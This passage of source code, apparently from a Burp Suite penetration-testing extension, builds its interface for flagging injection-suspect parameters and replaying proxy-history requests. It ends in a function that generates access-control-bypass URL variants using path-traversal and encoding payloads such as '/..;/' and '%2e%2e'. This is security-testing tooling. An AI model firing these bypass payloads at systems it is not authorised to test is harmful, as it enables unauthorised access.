        # self._cbBambdasFilesDownloadable.setEnabled(False)

        self._cbBambdasSQLi = JCheckBox('SQLi-suspect identifiers', False, itemStateChanged=self._cbBambdasSQLiFunc)
        self._txtBambdasSQLiKeywords = JTextField("", 100)
        self._txtBambdasSQLiKeywords.setToolTipText("Suspicious SQLi parameters")
        self._cbBambdasSQLi.setToolTipText("Suspicious SQLi parameters")
        # self._txtBambdasSQLiKeywords.setEnabled(False)
        # self._cbBambdasSQLi.setEnabled(False)
        
        self._cbBambdasXSS = JCheckBox('XXS-suspect identifiers', False, itemStateChanged=self._cbBambdasXSSFunc)
        self._txtBambdasXSSKeywords = JTextField("", 100)
        self._txtBambdasXSSKeywords.setToolTipText("Suspicious XSS parameters")
        self._cbBambdasXSS.setToolTipText("Suspicious XSS parameters")
        # self._txtBambdasXSSKeywords.setEnabled(False)
        # self._cbBambdasXSS.setEnabled(False)
        
        self._cbBambdasLFI = JCheckBox('LFI-suspect identifiers', False, itemStateChanged=self._cbBambdasLFIFunc)
        self._txtBambdasLFIKeywords = JTextField("", 100)
        self._txtBambdasLFIKeywords.setToolTipText("Suspicious LFI parameters")
        self._cbBambdasLFI.setToolTipText("Suspicious LFI parameters")
        # self._txtBambdasLFIKeywords.setEnabled(False)
        # self._cbBambdasLFI.setEnabled(False)
    
        self._cbBambdasSSRF = JCheckBox('SSRF-suspect identifiers', False, itemStateChanged=self._cbBambdasSSRFFunc)
        self._txtBambdasSSRFKeywords = JTextField("", 100)
        self._txtBambdasSSRFKeywords.setToolTipText("Suspicious SSRF parameters")
        self._cbBambdasSSRF.setToolTipText("Suspicious SSRF parameters")
        # self._txtBambdasSSRFKeywords.setEnabled(False)
        # self._cbBambdasSSRF.setEnabled(False)
    
        self._cbBambdasORed = JCheckBox('Open Redirect-suspect identifiers', False, itemStateChanged=self._cbBambdasORedFunc)
        self._txtBambdasORedKeywords = JTextField("", 100)
        self._cbBambdasORed.setToolTipText("Suspicious Open Redirect parameters")
        self._txtBambdasORedKeywords.setToolTipText("Suspicious Open Redirect parameters")
        # self._txtBambdasORedKeywords.setEnabled(False)
        # self._cbBambdasORed.setEnabled(False)
    
        self._cbBambdasRCE = JCheckBox('RCE-suspect identifiers', False, itemStateChanged=self._cbBambdasRCEFunc)
        self._txtBambdasRCEKeywords = JTextField("", 100)
        self._txtBambdasRCEKeywords.setToolTipText("Suspicious RCE parameters")
        self._cbBambdasRCE.setToolTipText("Suspicious RCE parameters")
        # self._txtBambdasRCEKeywords.setEnabled(False)
        # self._cbBambdasRCE.setEnabled(False)
    
        self._cbBambdasVulnJS = JCheckBox('Vulnerable JS Functions', False, itemStateChanged=self._cbBambdasVulnJSFunc)
        self._txtBambdasVulnJSKeywords = JTextField("", 100)
        self._txtBambdasVulnJSKeywords.setToolTipText("Vulnerable JavaScript Functions")
        self._cbBambdasVulnJS.setToolTipText("Vulnerable JavaScript Functions")
        # self._txtBambdasVulnJSKeywords.setEnabled(False)
        # self._cbBambdasVulnJS.setEnabled(False)
    
        self._cbBambdasExtIgnore = JCheckBox('File extensions to ignore', True, itemStateChanged=self._cbBambdasExtIgnoreFunc)
        self._txtBambdasExtIgnoreKeywords = JTextField("", 100)
        self._txtBambdasExtIgnoreKeywords.setToolTipText("Which file extensions will be ignored?")
        self._cbBambdasExtIgnore.setToolTipText("Which file extensions will be ignored?")

        __tabBambdasPanelTop_Left = JPanel()
        layout = GroupLayout(__tabBambdasPanelTop_Left)
        __tabBambdasPanelTop_Left.setLayout(layout)
        layout.setAutoCreateGaps(True)
        layout.setAutoCreateContainerGaps(True)
    
        layout.setHorizontalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self._btnBambdasRun)
                    .addComponent(self._lblBambdasforWhat)
                    .addComponent(self._lblBambdasScope)
                    .addComponent(self._cbBambdasExtIgnore)
                    .addComponent(self._lblBambdasColorScope)
                    .addComponent(self._lblBambdasColorScopeSecondary)
                    .addComponent(self._lblBambdasColorKeyWords)
                    .addComponent(self._lblBambdasDisplayDays)
                    .addComponent(self._lblBambdasProcessDays)
                    .addComponent(self._lblBambdasSearchScope)
                    .addComponent(self._cbBambdasHTTPMethods)
                    .addComponent(self._cbBambdasSearchHTMLCommnets)
                    .addComponent(self._cbBambdasFilesDownloadable)
                    .addComponent(self._cbBambdasVulnJS)
                    .addComponent(self._cbBambdasValuable)
                    .addComponent(self._cbBambdasSQLi)
                    .addComponent(self._cbBambdasXSS)
                    .addComponent(self._cbBambdasLFI)
                    .addComponent(self._cbBambdasSSRF)
                    .addComponent(self._cbBambdasORed)
                    .addComponent(self._cbBambdasRCE)
                    .addComponent(self._cbBambdasExtIgnore)
                    .addComponent(self._lblBambdasNotification1))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self._btnBambdasReset)
                    .addComponent(self._cbBambdasforWhat, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasScope)
                    .addComponent(self._txtBambdasExtIgnoreKeywords)
                    .addComponent(self._cbBambdasColorScope, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasColorScopeSecondary, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasColorKeyWords, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasDisplayDays, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addComponent(self._cbBambdasProcessDays, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(self._cbBambdasSearchinURL)
                        .addGap(10)
                        .addComponent(self._cbBambdasSearchinReq)
                        .addGap(10)
                        .addComponent(self._cbBambdasSearchinRes))
                    .addComponent(self._txtBambdasHTTPMethods)
                    .addComponent(self._txtBambdasSearchHTMLCommnets)
                    .addComponent(self._txtBambdasFilesDownloadable)
                    .addComponent(self._txtBambdasVulnJSKeywords)
                    .addComponent(self._txtBambdasValuable)
                    .addComponent(self._txtBambdasSQLiKeywords)
                    .addComponent(self._txtBambdasXSSKeywords)
                    .addComponent(self._txtBambdasLFIKeywords)
                    .addComponent(self._txtBambdasSSRFKeywords)
                    .addComponent(self._txtBambdasORedKeywords)
                    .addComponent(self._txtBambdasRCEKeywords)
                    .addComponent(self._lblBambdasNotification2))
        )
    
        layout.setVerticalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._btnBambdasRun)
                    .addComponent(self._btnBambdasReset))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasforWhat)
                    .addComponent(self._cbBambdasforWhat))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasScope)
                    .addComponent(self._cbBambdasScope))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasExtIgnore)
                    .addComponent(self._txtBambdasExtIgnoreKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasColorScope)
                    .addComponent(self._cbBambdasColorScope))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasColorScopeSecondary)
                    .addComponent(self._cbBambdasColorScopeSecondary))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasColorKeyWords)
                    .addComponent(self._cbBambdasColorKeyWords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasDisplayDays)
                    .addComponent(self._cbBambdasDisplayDays))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasProcessDays)
                    .addComponent(self._cbBambdasProcessDays))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasSearchScope)
                    .addComponent(self._cbBambdasSearchinURL)
                    .addComponent(self._cbBambdasSearchinReq)
                    .addComponent(self._cbBambdasSearchinRes))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasHTTPMethods)
                    .addComponent(self._txtBambdasHTTPMethods))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasSearchHTMLCommnets)
                    .addComponent(self._txtBambdasSearchHTMLCommnets))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasFilesDownloadable)
                    .addComponent(self._txtBambdasFilesDownloadable))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasVulnJS)
                    .addComponent(self._txtBambdasVulnJSKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasValuable)
                    .addComponent(self._txtBambdasValuable))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasSQLi)
                    .addComponent(self._txtBambdasSQLiKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasXSS)
                    .addComponent(self._txtBambdasXSSKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasLFI)
                    .addComponent(self._txtBambdasLFIKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasSSRF)
                    .addComponent(self._txtBambdasSSRFKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasORed)
                    .addComponent(self._txtBambdasORedKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._cbBambdasRCE)
                    .addComponent(self._txtBambdasRCEKeywords))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                    .addComponent(self._lblBambdasNotification1)
                    .addComponent(self._lblBambdasNotification2))
        )

        # 1. Satr - Scope URLs
        self._tbBambdasScopeURLs = JTextPane()
        self._tbBambdasScopeURLs.setToolTipText("Add URLs to define the scope of the test. You can enter multiple links, each on a new line. Leave this field empty to include all everything by default.")
        self._txBambdasScopeURLs = "Please provide all URLs in the testing scope. Some examples:\n\t- /\n\t+ Root paths include all URLS"
        placeholderText1 = self._txBambdasScopeURLs
        self._tbBambdasScopeURLs.setText(placeholderText1)
        self._tbBambdasScopeURLs.setForeground(Color.GRAY)
        listener1 = MyFocusListener(self._tbBambdasScopeURLs, placeholderText1)
        self._tbBambdasScopeURLs.addFocusListener(listener1)

        self._lbBambdasScopeURLs = JLabel("Definition of testing scope", SwingConstants.LEFT)
        self._lbBambdasScopeURLs.setFont(self._lbBambdasScopeURLs.getFont().deriveFont(Font.BOLD))

        # 2. Satr - Already Tested URLs
        self._tbBambdasScopeDoneURLs = JTextPane()
        self._tbBambdasScopeDoneURLs.setToolTipText("Add URLs that have been tested. You can enter multiple links, each on a new line. Leave this field empty if no specific URLs were assessed.")
        self._txBambdasScopeDoneURLs = "Please provide URLs already tested. Some examples:\n\t- /admin/*/users/*/class\n\t+ Asterisk stands for ID, UUID, etc, and rest of path will be included."
        placeholderText2 = self._txBambdasScopeDoneURLs
        self._tbBambdasScopeDoneURLs.setText(placeholderText2)
        self._tbBambdasScopeDoneURLs.setForeground(Color.GRAY)
        listener2 = MyFocusListener(self._tbBambdasScopeDoneURLs, placeholderText2)
        self._tbBambdasScopeDoneURLs.addFocusListener(listener2)

        self._lbBambdasScopeDoneURLs = JLabel("Already Tested URLs", SwingConstants.LEFT)
        self._lbBambdasScopeDoneURLs.setFont(self._lbBambdasScopeDoneURLs.getFont().deriveFont(Font.BOLD))

        # 3. Satr - BlackListed URLs
        self._tbBambdasBlackListedURLs = JTextPane()
        self._tbBambdasBlackListedURLs.setToolTipText("Add URLs you want to exclude from appearing in the HTTP call history. You can enter multiple links, each on a new line. Leave this field empty to include nothing.")
        self._txBambdasBlackListedURLs = "Please provide the URLs to be blacklisted, to exclude from the HTTP call history. Some examples:\n\t-/health-check\n\t+ Excludes specifically this path, and rest:\n\t\t+ /health-check\n\t\t+ /health-check/Monitor\n\t\t+ /health-check/?Level=Info"
        placeholderText3 = self._txBambdasBlackListedURLs
        self._tbBambdasBlackListedURLs.setText(placeholderText3)
        self._tbBambdasBlackListedURLs.setForeground(Color.GRAY)
        listener3 = MyFocusListener(self._tbBambdasBlackListedURLs, placeholderText3)
        self._tbBambdasBlackListedURLs.addFocusListener(listener3)

        self._lbBambdasBlackListedURLs = JLabel("Black-Listed URLs", SwingConstants.LEFT)
        self._lbBambdasBlackListedURLs.setFont(self._lbBambdasBlackListedURLs.getFont().deriveFont(Font.BOLD))

        __tabBambdasPanelTop_Right = JPanel()
        __tabBambdasPanelTop_Right.setLayout(BoxLayout(__tabBambdasPanelTop_Right, BoxLayout.Y_AXIS))

        # Scope Label ve ScrollPane
        __tabBambdasPanelTop_Right.add(self._lbBambdasScopeURLs)
        scrollBambdasScopeURLs = JScrollPane(self._tbBambdasScopeURLs)
        scrollBambdasScopeURLs.setPreferredSize(Dimension(400, 100))
        __tabBambdasPanelTop_Right.add(scrollBambdasScopeURLs)

        # Done Label ve ScrollPane (Yeni eklendi)
        __tabBambdasPanelTop_Right.add(self._lbBambdasScopeDoneURLs)
        scrollBambdasScopeDoneURLs = JScrollPane(self._tbBambdasScopeDoneURLs)
        scrollBambdasScopeDoneURLs.setPreferredSize(Dimension(400, 100))
        __tabBambdasPanelTop_Right.add(scrollBambdasScopeDoneURLs)

        # Blacklisted Label ve ScrollPane
        __tabBambdasPanelTop_Right.add(self._lbBambdasBlackListedURLs)
        scrollBambdasBlackListedURLs = JScrollPane(self._tbBambdasBlackListedURLs)
        scrollBambdasBlackListedURLs.setPreferredSize(Dimension(400, 100))
        __tabBambdasPanelTop_Right.add(scrollBambdasBlackListedURLs)

        _tabBambdasPanelTop = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
 
        _tabBambdasPanelTop.setResizeWeight(0.5)
        _tabBambdasPanelTop.setLeftComponent(__tabBambdasPanelTop_Left)
        _tabBambdasPanelTop.setRightComponent(__tabBambdasPanelTop_Right)
        _tabBambdasPanelBottom = JPanel(BorderLayout())
        self._tbBambdasScript = JTextPane()
        self._tbBambdasScript.setContentType("text")
        self._tbBambdasScript.setToolTipText("Bambdas script will appear here after you click the 'Run' button.")
        self._tbBambdasScript.setEditable(True)
        self._txBambdasScript = "/* Bambdas Script will be in here automatically */"
        self.updateBambdasScriptText("/* Bambdas Script will be in here automatically */")
        scroll_pane = JScrollPane(self._tbBambdasScript)

        # Add custom MouseWheelListener to slow down scrolling
        class SlowScrollMouseWheelListener(MouseWheelListener):
            def mouseWheelMoved(inner_self, e):
                scrollBar = scroll_pane.getVerticalScrollBar()
                amount = e.getUnitsToScroll() * 5  # Adjust the multiplier for scroll speed
                scrollBar.setValue(scrollBar.getValue() + amount)
                e.consume()  # Prevent default fast scroll

        self._tbBambdasScript.addMouseWheelListener(SlowScrollMouseWheelListener())

        _tabBambdasPanelBottom.add(scroll_pane, BorderLayout.CENTER)
        self._tabBambdasPanel = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        self._tabBambdasPanel.setResizeWeight(0.1)
        self._tabBambdasPanel.setBorder(EmptyBorder(10, 10, 10, 10))
        self._tabBambdasPanel.setTopComponent(_tabBambdasPanelTop)
        self._tabBambdasPanel.setBottomComponent(_tabBambdasPanelBottom)

        self.funcBambdasUIReset(self)
        return

    def listChange(self, ev):
        try:
            self._tbAuthenticationHeader.setText(self._helpers.bytesToString(self._helpers.buildHttpMessage(self.authenticationMatrix[self.tabAuthenticationJlist.getSelectedIndex()][1], self.authenticationMatrix[self.tabAuthenticationJlist.getSelectedIndex()][2])))
            self._tbAuthenticationHeader.setSelectionStart(0)
            self._tbAuthenticationHeader.setSelectionEnd(0)
        except:
            pass
        return

    def historyFetchHostname(self, ev):
        #load hostname from history
        t = Thread(target=self.historyFetchHostnameThread, args=[self])
        t.start()
        return
    def historyFetchHostnameThread(self, ev):
        self._cbAuthenticationHost.removeAllItems()
        _hostnames = []
        histories = self._callbacks.getProxyHistory()
        for history in histories:
            _hostname = str(self._helpers.analyzeRequest(history).getUrl().getHost())
            if _hostname not in _hostnames:
                _hostnames.append(_hostname)
                self._cbAuthenticationHost.addItem(_hostname)
        return

    def historyFetcher(self, ev):
        #read from history
        t = Thread(target=self.historyFetcherThread, args=[self])
        t.start()
        return
    
    def historyFetcherThread(self, ev):
        if self._cbAuthenticationHost.getSelectedIndex() < 0:
            self._lblAuthenticationNotification.text = "Please select a hostname from the history, or 'Reset' the screen to update the list."
            return
        
        self.url_filter = URLFilter()

        urlVerification = False
        ignoredURLs = 0
        self._btnAuthenticationFetchHistory.setEnabled(False)
        self._btnAuthenticationReset.setEnabled(False)
        self._cbAuthenticationHost.setEnabled(False)
        self._btnAuthenticationRun.setEnabled(False)
        self._cbAuthenticationEnableFilter.setEnabled(False)
        self._lblAuthenticationDaystoShow.setEnabled(False)
        self._cbAuthenticationDaystoShow.setEnabled(False)
        self._lblAuthenticationEnableURLGroup.setEnabled(False)
        self._cbAuthenticationEnableURLGroup.setEnabled(False)
        self._lblAuthenticationEnableFilter2.setEnabled(False)
        self.txAuthenticationEnableKeyWordURL.setEnabled(False)
        histories = self._callbacks.getProxyHistory()[::-1]
        self._lblAuthenticationNotification.text = "Please wait while porxy history records are beeing analyzed."
        for history in histories:
            
            if self._cbAuthenticationEnableFilter.isSelected() and self._cbAuthenticationDaystoShow.getSelectedIndex() != 3:

                if history.getResponse() is None:
                    continue
                _headerResponse = self._helpers.analyzeResponse(self._helpers.bytesToString(history.getResponse())).getHeaders()
                response_date = None
                for header in _headerResponse:
                    if header.startswith("Date:"):
                        response_date = SimpleDateFormat("EEE, dd MMM yyyy HH:mm:ss z", Locale.ENGLISH).parse(header.split("Date:")[1].strip())
                        break

                calendar = Calendar.getInstance()
                if response_date is None:
                    continue
                elif self._cbAuthenticationDaystoShow.getSelectedIndex() == 0:
                    calendar.add(Calendar.DATE, -1)
                    days_ago = calendar.getTime()
                    if response_date.before(days_ago):
                        continue
                elif self._cbAuthenticationDaystoShow.getSelectedIndex() == 1:
                    calendar.add(Calendar.DATE, -3)
                    days_ago = calendar.getTime()
                    if response_date.before(days_ago):
                        continue
                elif self._cbAuthenticationDaystoShow.getSelectedIndex() == 2:
                    calendar.add(Calendar.DATE, -7)
                    days_ago = calendar.getTime()
                    if response_date.before(days_ago):
                        continue

            if self._cbAuthenticationHost.getSelectedItem() == str(self._helpers.analyzeRequest(history).getUrl().getHost()):
                # 0 is url
                _url = str(self._helpers.analyzeRequest(history).getUrl())
                if _url.startswith("https"):
                    _url = _url.replace(":443/", "/")
                elif _url.startswith("http"):
                    _url = _url.replace(":80/", "/")

                _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
                if any(_url in sublist for sublist in self.authenticationMatrix) or not _url or any(re.findall(url_regex, _url, re.IGNORECASE)) or any(re.findall(ext_regex, _ext, re.IGNORECASE)):
                    continue

                if self._cbAuthenticationEnableFilter.isSelected() and self.txAuthenticationEnableKeyWordURL.getText().strip():
                    keywords = [kw.strip() for kw in self.txAuthenticationEnableKeyWordURL.getText().split(',')]
                    if not any(keyword in _url for keyword in keywords):
                        continue

                should_process = True
                if self._cbAuthenticationEnableFilter.isSelected() and self._cbAuthenticationEnableURLGroup.isSelected():
                    should_process = self.url_filter.should_process(_url)

                if should_process:
                    urlVerification = True
                    self.tableMatrixAuthentication_DM.addRow([_url])
                    # 1 is header
                    _header = self._helpers.analyzeRequest(history).getHeaders()
                    headerRemoves = []
                    for header in _header:
                        if any(re.findall(r'(cookie|token|auth|content-length)(.*:)', header, re.IGNORECASE)):
                            headerRemoves.append(header)
                    for header in headerRemoves:
                        _header.remove(header)

                    # 2 is body
                    _body = self._helpers.bytesToString(history.getRequest()[self._helpers.analyzeRequest(history).getBodyOffset():])
                
                    self._urlAddresses.addElement(_url)
                    self.authenticationMatrix.append([_url, _header, _body])
                else:
                    ignoredURLs += 1

        self._btnAuthenticationRun.setEnabled(True)
        self._btnAuthenticationFetchHistory.setEnabled(True)
        self._btnAuthenticationReset.setEnabled(True)
        self._cbAuthenticationHost.setEnabled(True)
        self._cbAuthenticationEnableFilter.setEnabled(True)
        self._lblAuthenticationDaystoShow.setEnabled(True)
        self._cbAuthenticationDaystoShow.setEnabled(True)
        self._lblAuthenticationEnableURLGroup.setEnabled(True)
        self._cbAuthenticationEnableURLGroup.setEnabled(True)
        self._lblAuthenticationEnableFilter2.setEnabled(True)
        self.txAuthenticationEnableKeyWordURL.setEnabled(True)

        if not urlVerification:
            self._lblAuthenticationNotification.text = "No matching criteria found, and no records were added. Please review target hostname and filters."
            return
        ignoredURLsTxt = ""
        if ignoredURLs > 0:
            ignoredURLsTxt = str(ignoredURLs) + " similar URLs were ignored."

        self._lblAuthenticationNotification.text = "'" + str(self._cbAuthenticationHost.getSelectedItem()) + "' and '" + str(len(self.authenticationMatrix)) + "' requests loaded (session identifiers removed and URLs with actions like delete, remove, kill, terminate, log-out skipped)." + ignoredURLsTxt + " Load more or click 'RUN' to proceed."

        self._cbAuthenticationHost.removeItemAt(self._cbAuthenticationHost.getSelectedIndex())
        self.tabAuthenticationJlist.setSelectedIndex(0)
        if self._cbAuthenticationHost.getItemCount() == 0:
            self._btnAuthenticationFetchHistory.setEnabled(False)
        return


    def resetAuthentication(self, ev):
        self.authenticationMatrix = []
        self._httpReqResAuthentication =[]
        self._httpReqResAuthenticationTipMessage =[]
        self.tableMatrixAuthentication = []
        self.tableMatrixAuthentication_DM = CustomDefaultTableModel(self.tableMatrixAuthentication, ('URLs', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10'))
        self.tableMatrixAuthentication = JTable(self.tableMatrixAuthentication_DM)
        self.tableMatrixAuthentication_SP.getViewport().setView((self.tableMatrixAuthentication))
        self._requestViewerAuthentication.setMessage("", False)
        self._responseViewerAuthentication.setMessage("", False)
        self.progressBarAuthenticationPanel.setValue(0)
        self.tableMatrixAuthentication.getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self.tableMatrixAuthentication.getColumnModel().getSelectionModel().addListSelectionListener(self._updateAuthenticationReqResView)
        self._btnAuthenticationFetchHistory.setEnabled(True)
        self._btnAuthenticationRun.setEnabled(False)
        self.tabAuthenticationJlist.getModel().removeAllElements()
        self._tbAuthenticationHeader.setText("")
        self._tabAuthenticationPanel.setDividerLocation(0.3)
        self._tabAuthenticationSplitpane.setDividerLocation(0.7)
        self._tabAuthenticationSplitpaneHttp.setDividerLocation(0.5)
        self.currentText = "You can load http requests over right click or fetch from proxy history."
        self.historyFetchHostname(self)
        self.tableMatrixAuthentication.getColumnModel().getColumn(0).setPreferredWidth(400)
        self.txAuthenticationEnableKeyWordURL.setVisible(False)
        self.txAuthenticationEnableKeyWordURL.setText("")
        self._lblAuthenticationEnableFilter2.setVisible(False)
        self._lblAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setVisible(False)
        self._cbAuthenticationDaystoShow.setSelectedIndex(2)
        self._lblAuthenticationEnableURLGroup.setVisible(False)
        self._cbAuthenticationEnableURLGroup.setVisible(False)
        self._cbAuthenticationEnableURLGroup.setSelected(True)
        self._cbAuthenticationEnableFilter.setSelected(False)
        self._lblAuthenticationNotification.text = self.currentText
        return
    
    def authenticationMatrixFunc(self, ev):
        # run authentication bypass
        t = Thread(target=self.authenticationMatrixThread, args=[self, self.authenticationMatrix])
        t.start()
        return
    
    def _updateAuthenticationReqResView(self, ev):
        try:
            _row = self.tableMatrixAuthentication.getSelectedRow()
            _column = self.tableMatrixAuthentication.getSelectedColumn()

            if _column == 0:
                self._requestViewerAuthentication.setMessage("", False)
                self._responseViewerAuthentication.setMessage("", False)
            else:
                self._requestViewerAuthentication.setMessage(self._httpReqResAuthentication[_row][_column].getRequest(), False)
                self._responseViewerAuthentication.setMessage(self._httpReqResAuthentication[_row][_column].getResponse(), False)
        except:
            self._requestViewerAuthentication.setMessage("", False)
            self._responseViewerAuthentication.setMessage("", False)


    def authenticationMatrixCalls(self, _url, _header, _body, _portNum, _row, _column, _progressBar):
        try:
            self._lblAuthenticationNotification.text = "Please hold on, the table fields are being populated, and '" + str(self.progressBarAuthenticationPanel.getValue() / 10000) + "%' has been completed so far."
            self.progressBarAuthenticationPanel.setValue(self.progressBarAuthenticationPanel.getValue() + _progressBar)
            _body = self._helpers.stringToBytes(_body)
            _request = self._helpers.buildHttpMessage(_header, _body)
            _httpService = self._helpers.buildHttpService(urlparse.urlparse(_url).hostname, _portNum, urlparse.urlparse(_url).scheme)
            _response = self._callbacks.makeHttpRequest(_httpService, _request)
            _msgBody = self._helpers.bytesToString(_response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getBodyOffset():])
            _status = str(self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getStatusCode())
            
            if (_column == 32 or _column == 33 or _column == 34) and _status == '200':
                header = list(_header)
                del header[3]
                del header[3]
                url = _url.split('/',3)[0] + "//" + _url.split('/',3)[2] + "/"
                request = self._helpers.buildHttpMessage(header, _body)
                httpService = self._helpers.buildHttpService(urlparse.urlparse(url).hostname, _portNum, urlparse.urlparse(url).scheme)
                response = self._callbacks.makeHttpRequest(httpService, request)
                status = str(self._helpers.analyzeResponse(self._helpers.bytesToString(response.getResponse())).getStatusCode())
                if status == '200':
                    _msgBody = self._helpers.bytesToString(_response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(_response.getResponse())).getBodyOffset():])
                    msgBody = self._helpers.bytesToString(response.getResponse()[self._helpers.analyzeResponse(self._helpers.bytesToString(response.getResponse())).getBodyOffset():])
                    if msgBody == _msgBody:
                        _status = _status + "-"

            if not _msgBody:
                _status = _status + "(EmptyBody)"
            
            if not self.tableMatrixAuthentication_DM.getValueAt(_row, _column):
                self.tableMatrixAuthentication_DM.setValueAt(_status, _row, _column)
            
            return _response

        except:
            print str(sys.exc_info()[1])
            self._lblAuthenticationNotification.text = "An error has occurred, but still in progress!"
            self.tableMatrixAuthentication_DM.setValueAt("null", _row, _column)
            self.errorNumbers +=1
            return ""

    def columnNumber(self, _urlPathes):
        columnNum = 0
        self.cellNumbers = 0
        for _urlPath in _urlPathes:
            try:
                _columnNum = 0
                _urls = self.urlDuplicator(_urlPath)
                if len(_urls) == 1:
                    _columnNum = 45
                else:
                    _columnNum = 89
                
                _rowUrls = []
                _searchFor = '/'
                _rowUrls.append(_urlPath)


                # column6, example url: http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/../company/users/admin?id=1
                #                       http://dvwa.local/company/users/../users/admin?id=1
                #                       http://dvwa.local/company/users/admin/../admin?id=1
                _replaceWiths = ["/%2e%2e/", "/../", "/..././", "/..;/", "/..;", "..;"]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') != 3:
                            if urlparse.urlparse(_url).path.endswith('/'):
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))[:-1]
                            else: 
                                _paths = urlparse.urlparse(_url).path.split('/', urlparse.urlparse(_url).path.count('/'))
                            _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                            path = _url[:_locations[2]]
                            for _path in _paths:
                                if _path:
                                    path = path + "/" + _path
                                    url =  _url.replace(path, path + _replaceWith + _path)
                                    if url not in _rowUrls:
                                        _rowUrls.append(url)
                                        _columnNum = _columnNum + 1
                # column6
                


                #column7, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/../company/users/admin?id=1
                #                       http://dvwa.local/;/company/users/admin?id=1
                #                       http://dvwa.local/company/;/users/admin?id=1
                #                       http://dvwa.local/company/users/;/admin?id=1
                _replaceWiths = ["/./", "/../", "/..././", "/;/", "//;//", "/.;/", "/;", "/.;", "/%2e/", "/%2f/", "/%20/", "/%3b/", "/%00/", "/%ff/", "/%01/", "/%0a/", "/%0d/", "/%09/"]
                _locations = [i for i in range(len(str(_url))) if str(_url).startswith(_searchFor, i)]
                for _replaceWith in _replaceWiths:
                    for _url in _urls:
                        if _url.count('/') == 3:
                            url = _url[: _locations[2]] + _replaceWith + _url[_locations[2] + 1:]
                            if '..' in url:
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                        else:
                            for _location in _locations[2:]:
                                url = _url[: _location] + _replaceWith + _url[_location + 1:]
                                if url not in _rowUrls:
                                    _rowUrls.append(url)
                                    _columnNum = _columnNum + 1
                                if '..' in url:
                                    break
                #column7


                #column8, example url:  http://dvwa.local/company/users/admin?id=1
                #                       http://dvwa.local/company/users/admin?id=1%00
                #                       http://dvwa.local/company/users/admin?id=1%00/
                #                       http://dvwa.local/company/users/admin?id=1../
                #                       http://dvwa.local/company/users/admin?id=1/../
                #                       http://dvwa.local/company/users/admin?id=1..;/
